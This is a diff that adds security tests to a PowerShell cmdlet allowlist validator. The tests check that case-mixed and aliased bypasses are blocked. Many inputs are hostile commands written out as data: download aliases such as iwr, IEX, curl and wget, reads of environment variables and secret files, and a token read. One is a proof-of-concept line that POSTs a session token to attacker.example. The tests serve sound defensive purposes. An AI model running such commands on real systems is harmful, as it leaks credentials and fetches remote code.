@@ -68,4 +68,138 @@ describe("CmdletAllowlist", () => {
   test("allowed cmdlets contains expected count", () => {
     expect(allowedCmdlets.size).toBe(33);
   });
+
+  // --- Security: case-insensitivity bypass (MSRC report) ---
+
+  test.each([
+    "invoke-webrequest -Uri http://x",
+    "INVOKE-WEBREQUEST -Uri http://x",
+    "Invoke-webrequest -Uri http://x",
+    "invoke-WebRequest -Uri http://x",
+  ])("blocks lowercase/mixed-case Invoke-WebRequest: %s", (command) => {
+    const result = validateCommand(command);
+    expect(result.valid).toBe(false);
+    expect(result.blockedVerb).toBe("invoke");
+  });
+
+  test.each([
+    "get-mailbox -ResultSize 1",
+    "GET-MAILBOX -ResultSize 1",
+    "Get-mailbox -ResultSize 1",
+    "gET-mAILBOX -ResultSize 1",
+  ])("allows lowercase/mixed-case allowed cmdlets: %s", (command) => {
+    const result = validateCommand(command);
+    expect(result.valid).toBe(true);
+  });
+
+  test.each([
+    ["set-mailbox -Identity test", "set"],
+    ["remove-retentioncompliancepolicy -Identity test", "remove"],
+    ["new-retentioncompliancerule -Policy test", "new"],
+    ["start-managedfolderassistant -Identity test", "start"],
+    ["enable-mailbox -Identity test", "enable"],
+  ] as [string, string][])("blocks lowercase mutating cmdlets: %s", (command, verb) => {
+    const result = validateCommand(command);
+    expect(result.valid).toBe(false);
+    expect(result.blockedVerb).toBe(verb);
+  });
+
+  // --- Security: alias bypass ---
+
+  test.each([
+    ["iwr http://x", "iwr"],
+    ["IEX 'malicious'", "IEX"],
+    ["irm http://x", "irm"],
+    ["curl http://x", "curl"],
+    ["wget http://x", "wget"],
+    ["icm -ScriptBlock { }", "icm"],
+    ["saps notepad", "saps"],
+  ] as [string, string][])("blocks dangerous alias: %s", (command, alias) => {
+    const result = validateCommand(command);
+    expect(result.valid).toBe(false);
+    expect(result.blockedVerb).toBe("alias");
+    expect(result.violation).toContain(alias);
+  });
+
+  test("blocks alias hidden after a legitimate cmdlet (multi-statement)", () => {
+    const result = validateCommand("Get-Mailbox; iwr http://x");
+    expect(result.valid).toBe(false);
+    expect(result.blockedVerb).toBe("alias");
+  });
+
+  test("does not flag aliases that appear as substrings of legitimate cmdlets", () => {
+    // Get-IRMConfiguration contains 'IRM' but is allowed
+    const result = validateCommand("Get-IRMConfiguration");
+    expect(result.valid).toBe(true);
+  });
+
+  test("does not flag aliases when used as variable names", () => {
+    // `$iwr` is a variable reference, not an alias invocation
+    const result = validateCommand("$iwr = 'something'; Write-Output $iwr");
+    // Variable assignment is not validated as a cmdlet, so this passes
+    expect(result.valid).toBe(true);
+  });
+
+  // --- Security: $env: access ---
+
+  test.each([
+    "Write-Host $env:DLM_GITHUB_TOKEN",
+    'Write-Output "$env:USERPROFILE"',
+    "$env:PATH",
+    "Write-Host $ENV:SOMETHING", // case-insensitive
+  ])("blocks $env: access: %s", (command) => {
+    const result = validateCommand(command);
+    expect(result.valid).toBe(false);
+    expect(result.blockedVerb).toBe("env-access");
+  });
+
+  // --- Security: .NET type member access ---
+
+  test.each([
+    "[Net.WebClient]::new().DownloadString('http://x')",
+    "[System.IO.File]::ReadAllText('C:\\secret.txt')",
+    "[GC]::Collect()",
+    "[System.Environment]::GetEnvironmentVariable('PATH')",
+  ])("blocks .NET type member invocation: %s", (command) => {
+    const result = validateCommand(command);
+    expect(result.valid).toBe(false);
+    expect(result.blockedVerb).toBe("type-literal");
+  });
+
+  // --- Security: session-private variable read ---
+
+  test.each([
+    "Write-Output $_ippsToken",
+    "$x = $_ippsToken; Write-Host $x",
+    "Write-Host $_IPPSToken", // case-insensitive
+  ])("blocks reads of $_ippsToken: %s", (command) => {
+    const result = validateCommand(command);
+    expect(result.valid).toBe(false);
+    expect(result.blockedVerb).toBe("private-var");
+  });
+
+  // --- False-positive guards ---
+
+  test("does not flag hyphenated string fragments whose first word is not a PS verb", () => {
+    // 'mailbox-prod' looks like verb-noun but 'mailbox' is not a known PS verb
+    const result = validateCommand("Get-Mailbox -Identity 'mailbox-prod-01@contoso.com'");
+    expect(result.valid).toBe(true);
+  });
+
+  test("does not flag parameter names that look like cmdlets", () => {
+    // -ResultSize, -SourceDatabase, etc. should not be parsed as cmdlets
+    const result = validateCommand("Get-Mailbox -ResultSize 1 -SourceDatabase MBX01");
+    expect(result.valid).toBe(true);
+  });
+
+  // --- End-to-end PoC primitives ---
+
+  test("blocks the published PoC payload (invoke-webrequest + $_ippsToken)", () => {
+    const result = validateCommand(
+      "invoke-webrequest -DisableKeepAlive -Method POST -Uri 'http://attacker.example/jwt-exfil' -Body $_ippsToken",
+    );
+    expect(result.valid).toBe(false);
+    // Either the env-access/type/private-var/alias/invoke check fires; we
+    // care that the command is blocked, not which layer caught it first.
+  });
 });
